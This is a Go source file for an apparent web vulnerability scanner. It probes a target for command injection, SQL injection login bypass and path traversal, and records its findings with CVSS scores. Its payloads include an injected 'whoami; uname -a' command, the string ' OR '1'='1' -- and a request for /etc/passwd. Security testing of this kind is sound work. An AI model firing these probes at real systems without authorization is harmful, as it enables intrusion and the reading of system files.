package scanner

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"
)

type WebFinding struct {
	Vulnerability string  `json:"vulnerability"`
	Severity      string  `json:"severity"`
	Endpoint      string  `json:"endpoint"`
	PayloadUsed   string  `json:"payload_used"`
	Evidence      string  `json:"evidence"`
	CVSSScore     float64 `json:"cvss_score"`
}

type WebAssessmentResult struct {
	Target       string       `json:"target"`
	Findings     []WebFinding `json:"findings"`
	Errors       []string     `json:"errors"`
	Duration     string       `json:"duration"`
	TotalChecked int          `json:"total_checked"`
}

func webAssessmentRequest(client *http.Client, method, requestURL string, body io.Reader) (*http.Response, error) {
	req, err := http.NewRequest(method, requestURL, body)
	if err != nil {
		return nil, err
	}
	req.Header.Set("User-Agent", "CyberSentinel-WebAssessment/1.0")
	if body != nil {
		req.Header.Set("Content-Type", "application/json")
	}
	return client.Do(req)
}

// RunWebSecurityAssessment tests target-web for RCE, SQLi, and Path Traversal
func RunWebSecurityAssessment(target string) WebAssessmentResult {
	start := time.Now()
	baseURL := fmt.Sprintf("http://%s:80", target)
	client := &http.Client{Timeout: 5 * time.Second}
	findings := make([]WebFinding, 0)
	assessmentErrors := make([]string, 0)

	// 1. TEST COMMAND INJECTION (RCE)
	rcePayload := "whoami; uname -a"
	rceResp, err := webAssessmentRequest(client, http.MethodGet, fmt.Sprintf("%s/api/exec?cmd=%s", baseURL, url.QueryEscape(rcePayload)), nil)
	if err == nil {
		defer rceResp.Body.Close()
	} else {
		assessmentErrors = append(assessmentErrors, "Command injection check: "+err.Error())
	}
	if err == nil && rceResp.StatusCode == http.StatusOK {
		body, _ := io.ReadAll(rceResp.Body)
		var result struct {
			Status string `json:"status"`
			Output string `json:"output"`
		}
		if json.Unmarshal(body, &result) == nil && result.Status == "executed" && strings.TrimSpace(result.Output) != "" {
			findings = append(findings, WebFinding{
				Vulnerability: "OS Command Injection (Remote Code Execution)",
				Severity:      "CRITICAL",
				Endpoint:      "/api/exec?cmd=",
				PayloadUsed:   rcePayload,
				Evidence:      fmt.Sprintf("Arbitrary OS execution confirmed. Server output: %s", strings.TrimSpace(string(body))),
				CVSSScore:     9.8,
			})
		}
	}

	// 2. TEST SQL INJECTION (SQLi Auth Bypass)
	sqliPayload := "' OR '1'='1' -- "
	reqBody, _ := json.Marshal(map[string]string{
		"username": sqliPayload,
		"password": "random_password",
	})
	sqliResp, err := webAssessmentRequest(client, http.MethodPost, fmt.Sprintf("%s/api/login", baseURL), bytes.NewBuffer(reqBody))
	if err == nil {
		defer sqliResp.Body.Close()
	} else {
		assessmentErrors = append(assessmentErrors, "SQL injection check: "+err.Error())
	}
	if err == nil && sqliResp.StatusCode == http.StatusOK {
		body, _ := io.ReadAll(sqliResp.Body)
		if strings.Contains(string(body), "Welcome back") {
			findings = append(findings, WebFinding{
				Vulnerability: "SQL Injection Authentication Bypass",
				Severity:      "HIGH",
				Endpoint:      "/api/login (POST)",
				PayloadUsed:   sqliPayload,
				Evidence:      "Authentication successfully bypassed without credentials. Admin record returned.",
				CVSSScore:     8.5,
			})
		}
	}

	// 3. TEST PATH TRAVERSAL / LFI
	lfiPayload := "/etc/passwd"
	lfiResp, err := webAssessmentRequest(client, http.MethodGet, fmt.Sprintf("%s/api/view?file=%s", baseURL, url.QueryEscape(lfiPayload)), nil)
	if err == nil {
		defer lfiResp.Body.Close()
	} else {
		assessmentErrors = append(assessmentErrors, "Path traversal check: "+err.Error())
	}
	if err == nil && lfiResp.StatusCode == http.StatusOK {
		body, _ := io.ReadAll(lfiResp.Body)
		if strings.Contains(string(body), "root:") {
			findings = append(findings, WebFinding{
				Vulnerability: "Arbitrary File Read / Path Traversal",
				Severity:      "HIGH",
				Endpoint:      "/api/view?file=",
				PayloadUsed:   lfiPayload,
				Evidence:      "System file /etc/passwd leaked through unvalidated parameter.",
				CVSSScore:     7.5,
			})
		}
	}

	return WebAssessmentResult{
		Target:       target,
		Findings:     findings,
		Errors:       assessmentErrors,
		Duration:     time.Since(start).String(),
		TotalChecked: 3,
	}
}
